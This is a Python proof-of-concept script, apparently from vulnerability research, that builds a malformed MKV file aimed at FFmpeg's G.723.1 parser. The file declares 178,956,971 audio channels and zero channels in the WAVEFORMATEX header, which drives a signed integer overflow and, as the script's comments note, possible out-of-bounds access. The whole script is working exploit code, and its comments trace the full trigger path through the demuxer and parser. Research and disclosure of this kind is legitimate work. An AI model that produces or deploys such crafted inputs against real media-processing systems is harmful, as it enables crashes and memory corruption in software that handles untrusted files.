#!/usr/bin/env python3
"""
PoC generator for VULN 001: Integer Overflow in g723_1 Parser

Vulnerability: g723_1_parse() in libavcodec/g723_1_parser.c line 41
  next = frame_size[buf[0] & 3] * FFMAX(1, avctx->ch_layout.nb_channels);
  With nb_channels=178956971: 24 * 178956971 = 4294967304 -> signed int overflow

Trigger path:
  Matroska (MKV) demuxer sets need_parsing=AVSTREAM_PARSE_HEADERS for G.723.1
  MKV Channels EBML element stores 178956971 (no 16-bit limit unlike WAVEFORMATEX)
  A_MS/ACM with WAVEFORMATEX nChannels=0 -> av_channel_layout_check() returns 0
  -> mka_parse_audio() falls back to track->audio.channels = 178956971
  -> avcodec_parameters_to_context() copies to parser's avctx (no FF_SANE_NB_CHANNELS check)
  -> parse_packet() calls av_parser_parse2() -> g723_1_parse() with nb_channels=178956971

Rules:
  - NO compiling new C/C++ code
  - Only Python (struct/bytes) + shell
  - Binary: /data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg only
"""

import struct
import os

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_FILE = os.path.join(SCRIPT_DIR, "vuln_001_input.mkv")
NB_CHANNELS = 178956971  # 0x0AAAAAAB: triggers signed int overflow in g723_1_parse


# ---------- EBML encoding helpers ----------

def encode_ebml_id(id_int):
    """Return the wire bytes for an EBML element ID (big-endian, no vint transform)."""
    if id_int <= 0xFF:
        return bytes([id_int])
    elif id_int <= 0xFFFF:
        return struct.pack('>H', id_int)
    elif id_int <= 0xFFFFFF:
        return struct.pack('>I', id_int)[1:]   # 3 bytes
    else:
        return struct.pack('>I', id_int)        # 4 bytes


def encode_ebml_size(n):
    """Return EBML VINT encoding for a data size n."""
    if n < 0x7F:
        return bytes([0x80 | n])
    elif n < 0x3FFF:
        return struct.pack('>H', 0x4000 | n)
    elif n < 0x1FFFFF:
        return struct.pack('>I', 0x200000 | n)[1:]   # 3 bytes
    elif n < 0x0FFFFFFF:
        return struct.pack('>I', 0x10000000 | n)
    else:
        return struct.pack('>Q', 0x0100000000000000 | n)


def make_uint_bytes(n):
    """Encode unsigned integer n as minimal big-endian bytes."""
    if n == 0:
        return b'\x00'
    byte_len = (n.bit_length() + 7) // 8
    return n.to_bytes(byte_len, 'big')


def ebml_elem(id_int, data):
    """
    Build a complete EBML element: ID bytes + VINT(size) + data.
    data may be:
      bytes/bytearray  -> used as-is
      str              -> ASCII-encoded
      int              -> encoded as minimal big-endian unsigned integer
    """
    if isinstance(data, int):
        data = make_uint_bytes(data)
    elif isinstance(data, str):
        data = data.encode('ascii')
    return encode_ebml_id(id_int) + encode_ebml_size(len(data)) + data


def ebml_float64(f):
    """Encode a 64-bit float as big-endian bytes (for SamplingFrequency)."""
    return struct.pack('>d', f)


# ---------- EBML element IDs (from libavformat/matroska.h) ----------

EBML_ID_HEADER            = 0x1A45DFA3
EBML_ID_EBMLVERSION       = 0x4286
EBML_ID_EBMLREADVERSION   = 0x42F7
EBML_ID_EBMLMAXIDLENGTH   = 0x42F2
EBML_ID_EBMLMAXSIZELENGTH = 0x42F3
EBML_ID_DOCTYPE           = 0x4282
EBML_ID_DOCTYPEVERSION    = 0x4287
EBML_ID_DOCTYPEREADVERSION= 0x4285

MATROSKA_ID_SEGMENT       = 0x18538067
MATROSKA_ID_INFO          = 0x1549A966
MATROSKA_ID_TIMECODESCALE = 0x2AD7B1   # TimestampScale in ns
MATROSKA_ID_TRACKS        = 0x1654AE6B
MATROSKA_ID_TRACKENTRY    = 0xAE
MATROSKA_ID_TRACKNUMBER   = 0xD7
MATROSKA_ID_TRACKUID      = 0x73C5
MATROSKA_ID_TRACKTYPE     = 0x83       # 2 = audio
MATROSKA_ID_TRACKFLAGLACING = 0x9C
MATROSKA_ID_CODECID       = 0x86
MATROSKA_ID_CODECPRIVATE  = 0x63A2
MATROSKA_ID_TRACKAUDIO    = 0xE1
MATROSKA_ID_AUDIOSAMPLINGFREQ = 0xB5
MATROSKA_ID_AUDIOCHANNELS = 0x9F
MATROSKA_ID_CLUSTER       = 0x1F43B675
MATROSKA_ID_CLUSTERTIMECODE = 0xE7
MATROSKA_ID_SIMPLEBLOCK   = 0xA3

EBML_UNKNOWN_SIZE = bytes([0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF])


def main():
    print("[*] Generating crafted MKV/G.723.1 input file (VULN 001)")
    print(f"[+] NB_CHANNELS = {NB_CHANNELS} (0x{NB_CHANNELS:08X})")

    # ---- WAVEFORMATEX (14 bytes, A_MS/ACM codec private) ----
    # Structure (WAVEFORMATEX per Windows SDK):
    #   wFormatTag      (2 bytes LE): 0x0042 = G.723.1 -> sets par->codec_id = AV_CODEC_ID_G723_1
    #   nChannels       (2 bytes LE): 0x0000 = 0 channels
    #     KEY TRICK: nChannels=0 causes ff_get_wav_header() to produce an
    #     invalid channel layout ({AV_CHANNEL_ORDER_NONE, nb_channels=0}).
    #     av_channel_layout_check() returns 0 (invalid) for nb_channels<=0.
    #     mka_parse_audio() then falls through to:
    #       par->ch_layout.nb_channels = track->audio.channels  (= 178956971)
    #   nSamplesPerSec  (4 bytes LE): 8000
    #   nAvgBytesPerSec (4 bytes LE): 800
    #   nBlockAlign     (2 bytes LE): 24
    waveformatex = struct.pack('<HHIIH',
        0x0042,   # wFormatTag: G.723.1
        0,        # nChannels: 0  <- makes av_channel_layout_check() return INVALID
        8000,     # nSamplesPerSec
        800,      # nAvgBytesPerSec
        24,       # nBlockAlign
    )
    assert len(waveformatex) == 14, f"WAVEFORMATEX must be 14 bytes, got {len(waveformatex)}"

    # ---- Audio element (inside TrackEntry) ----
    # SamplingFrequency: 8000.0 Hz
    # Channels: 178956971 <- stored in MKV EBML, no 16-bit limit
    audio_inner = (
        ebml_elem(MATROSKA_ID_AUDIOSAMPLINGFREQ, ebml_float64(8000.0)) +
        ebml_elem(MATROSKA_ID_AUDIOCHANNELS, NB_CHANNELS)
    )
    audio_elem = ebml_elem(MATROSKA_ID_TRACKAUDIO, audio_inner)

    # ---- TrackEntry ----
    track_body = (
        ebml_elem(MATROSKA_ID_TRACKNUMBER, 1) +
        ebml_elem(MATROSKA_ID_TRACKUID, 1) +
        ebml_elem(MATROSKA_ID_TRACKTYPE, 2) +           # 2 = audio
        ebml_elem(MATROSKA_ID_TRACKFLAGLACING, 0) +
        ebml_elem(MATROSKA_ID_CODECID, "A_MS/ACM") +
        ebml_elem(MATROSKA_ID_CODECPRIVATE, waveformatex) +
        audio_elem
    )
    tracks_body = ebml_elem(MATROSKA_ID_TRACKENTRY, track_body)
    tracks = ebml_elem(MATROSKA_ID_TRACKS, tracks_body)

    # ---- Info ----
    info = ebml_elem(MATROSKA_ID_INFO,
        ebml_elem(MATROSKA_ID_TIMECODESCALE, 1000000)  # 1 ms per tick
    )

    # ---- Cluster with one SimpleBlock ----
    # SimpleBlock wire format:
    #   Track number VINT (1 byte for track 1): 0x81
    #   Relative timecode (int16 BE): 0x0000
    #   Flags (1 byte): 0x80 = keyframe
    #   Data: 24 bytes of G.723.1 type-0 frame (first byte & 3 == 0)
    #
    # Type-0 G.723.1 frame: first byte = 0x00 (low 2 bits = 00)
    # frame_size[0] = 24 bytes
    # Overflow: 24 * 178956971 = 4294967304 -> int32 signed overflow -> UBSAN error
    g723_type0_frame = bytes(24)   # 24 zero bytes; first byte=0x00, 0x00&3=0 (type 0)
    simpleblock_data = bytes([0x81, 0x00, 0x00, 0x80]) + g723_type0_frame

    cluster_body = (
        ebml_elem(MATROSKA_ID_CLUSTERTIMECODE, 0) +
        ebml_elem(MATROSKA_ID_SIMPLEBLOCK, simpleblock_data)
    )
    cluster = ebml_elem(MATROSKA_ID_CLUSTER, cluster_body)

    # ---- Segment (unknown size) ----
    segment_body = info + tracks + cluster
    segment = (encode_ebml_id(MATROSKA_ID_SEGMENT) +
               EBML_UNKNOWN_SIZE +
               segment_body)

    # ---- EBML Header ----
    header_body = (
        ebml_elem(EBML_ID_EBMLVERSION, 1) +
        ebml_elem(EBML_ID_EBMLREADVERSION, 1) +
        ebml_elem(EBML_ID_EBMLMAXIDLENGTH, 4) +
        ebml_elem(EBML_ID_EBMLMAXSIZELENGTH, 8) +
        ebml_elem(EBML_ID_DOCTYPE, "matroska") +
        ebml_elem(EBML_ID_DOCTYPEVERSION, 4) +
        ebml_elem(EBML_ID_DOCTYPEREADVERSION, 2)
    )
    header = ebml_elem(EBML_ID_HEADER, header_body)

    # ---- Final file ----
    file_data = header + segment

    with open(OUTPUT_FILE, 'wb') as f:
        f.write(file_data)

    print(f"[+] Output: {OUTPUT_FILE} ({len(file_data)} bytes)")
    print(f"[+] WAVEFORMATEX: wFormatTag=0x0042 (G.723.1), nChannels=0")
    print(f"[+] MKV Channels element: {NB_CHANNELS}")
    print(f"[+] Expected flow:")
    print(f"    ff_get_wav_header() -> codec_id=G723_1, ch_layout={{NONE,nb_channels=0}}")
    print(f"    av_channel_layout_check(nb_channels=0) -> 0 (invalid)")
    print(f"    mka_parse_audio() -> nb_channels = {NB_CHANNELS}")
    print(f"    avcodec_parameters_to_context() -> parser avctx.nb_channels = {NB_CHANNELS}")
    print(f"    need_parsing = AVSTREAM_PARSE_HEADERS (MKV for non-AAC audio)")
    print(f"    parse_packet() -> av_parser_parse2() -> g723_1_parse()")
    print(f"[+] Overflow calculation:")
    t0_raw = 24 * NB_CHANNELS
    t0_s32 = t0_raw & 0xFFFFFFFF
    if t0_s32 >= 0x80000000:
        t0_s32 -= 0x100000000
    t1_raw = 20 * NB_CHANNELS
    t1_s32 = t1_raw & 0xFFFFFFFF
    if t1_s32 >= 0x80000000:
        t1_s32 -= 0x100000000
    print(f"    Type-0: 24 * {NB_CHANNELS} = {t0_raw} -> int32 = {t0_s32}")
    print(f"    Type-1: 20 * {NB_CHANNELS} = {t1_raw} -> int32 = {t1_s32} (negative -> OOB)")


if __name__ == "__main__":
    main()
